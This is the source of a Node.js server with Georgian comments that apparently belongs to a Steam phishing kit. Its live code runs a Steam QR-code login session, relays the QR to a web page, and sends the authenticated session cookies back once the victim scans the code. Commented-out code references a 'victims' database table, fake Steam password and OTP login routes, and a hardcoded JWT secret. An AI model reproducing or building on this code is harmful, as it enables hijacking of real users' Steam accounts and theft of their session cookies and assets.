const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const cookieParser = require('cookie-parser');
const app = express();
const PORT = 4080;
const { LoginSession, EAuthTokenPlatformType } = require('steam-session');
const QRCode = require('qrcode');

app.use(express.json());
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'public/views'));

// მაგალითად, აქ შეგიძლია routes-ის დამატება
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'mainpage', 'index.html'));
});

// Express სერვერი HTTP სერვერად შევქმნათ
const server = http.createServer(app);

// WebSocket სერვერის შექმნა იმავე HTTP სერვერზე
const wss = new WebSocket.Server({ server });

wss.on('connection', async (ws) => {
  try {
    const session = new LoginSession(EAuthTokenPlatformType.SteamClient);
    const startResult = await session.startWithQR();

    // QR Challenge URL
    const qrUrl = startResult.qrChallengeUrl;

    // QR კოდის გენერაცია Data URL ფორმატში
    const qrImage = await QRCode.toDataURL(qrUrl);

    // უგზავნე კლიენტს QR კოდი და URL
    ws.send(JSON.stringify({ type: 'qr', qrUrl, qrImage }));

    // მოსმენა ლოგინის მოვლენებზე
    session.on('remoteInteraction', () => {
      ws.send(JSON.stringify({ type: 'scanned' }));
    });

    session.on('authenticated', async () => {
      ws.send(JSON.stringify({ type: 'authenticated' }));
      const cookies = await session.getWebCookies();
      ws.send(JSON.stringify({ type: 'cookies', cookies }));
      ws.close();
    });

    session.on('timeout', () => {
      ws.send(JSON.stringify({ type: 'timeout' }));
      ws.close();
    });

    session.on('error', (err) => {
      ws.send(JSON.stringify({ type: 'error', message: err.message }));
      ws.close();
    });

    ws.on('close', () => {
      if (!session.isAuthenticated) {
        session.cancelLoginAttempt();
      }
    });

  } catch (error) {
    ws.send(JSON.stringify({ type: 'error', message: error.message }));
    ws.close();
  }
});

// Express + WebSocket სერვერი ვუსმენს ამ პორტს
server.listen(PORT, () => {
  console.log(`Express და WebSocket სერვერი დაიწყო http://localhost:${PORT}`);
});









// const express = require('express')
// const app = express()
// app.use(express.json())
// const PORT = 4080


// const cookieParser = require('cookie-parser');
// app.use(cookieParser());
// const path = require('path')
// const db = require('./routes/config/db.js')
// app.use(express.static(path.join(__dirname, 'public')));
// app.set('view engine', 'ejs');
// app.set('views', path.join(__dirname, 'public/views'));
// const jwt = require('jsonwebtoken');

// const JWT_SECRET = 'adgadahadfhshwer234t5346y234rtuiopwdfg9382g138r23g523rgb23cufwepfu';

// async function CheckIFloggedIn(req, res, next) {
//     try {
//         const token = req.cookies.VicLoginToken;
        
//         if (!token) {
//             return next(); // No token, continue to route
//         }

//         const decoded = jwt.verify(token, JWT_SECRET);

//         const [rows] = await db.execute(
//             'SELECT * FROM victims WHERE steamID = ?',
//             [decoded.userid]
//         );

//         if (rows.length === 0) {
//             return res.status(403).json({
//                 success: false,
//                 message: 'User does not exist'
//             });
//         }
        
//         // Attach user to request
//         req.user = {
//             ...decoded,
//             dbData: rows[0]
//         };

//         // User is logged in, redirect to UserPersonal
//         return res.redirect('/UserPersonal');

//     } catch(error) {
//         // If token is invalid, just continue to route (like no token)
//         if (error instanceof jwt.JsonWebTokenError) {
//             return next();
//         }
//         // For other errors, send 500
//         return res.status(500).json({
//             success: false,
//             message: 'server error'
//         });
//     }
// }







// app.get('/' , CheckIFloggedIn ,async(req,res) => {
//     try{
//         res.sendFile(path.join(__dirname, 'public', 'mainpage', 'index.html'));
//     }catch(error){
//         res.status(500).json({
//             success:false,
//             message:'err server'
//         })
//     }
// })


// app.get('/Welcome' , CheckIFloggedIn ,async(req,res) => {
//     try{
//         res.sendFile(path.join(__dirname, 'public', 'Welcome', 'wel.html'));
//     }catch(error){
//         res.status(500).json({
//             success:false,
//             message:'err server'
//         })
//     }
// })



// // app.get('/test' , async(req,res) => {
// //     try{
// //         const [useres] = await db.execute('SELECT * FROM victims')
// //         res.status(200).json({
// //             useres
// //         })
// //     }catch(error){
// //         res.status(500).json({
// //             success:false,
// //             message:'err server'
// //         })
// //     }
// // })


// const sloginroute = require('./routes/steamlogin/steamlogpage.js')
// app.use('/Login',sloginroute)

// const sloginpassword = require('./routes/steamlogin/sloginpassword.js')
// app.use('/Loginwithpass',sloginpassword)

// const steamOTP = require('./routes/steamlogin/steamotp.js')
// app.use('/steamOTP',steamOTP)


// const userspage = require('./routes/userpage/user.js')
// app.use('/UserPersonal',userspage)

// // const refreshqr = require('./routes/qrcode/qrcoderefresh.js')
// // app.use('/refreshqr',refreshqr)

// app.listen(PORT, ()=> {
//     console.log(`http://localhost:${PORT}`)
// })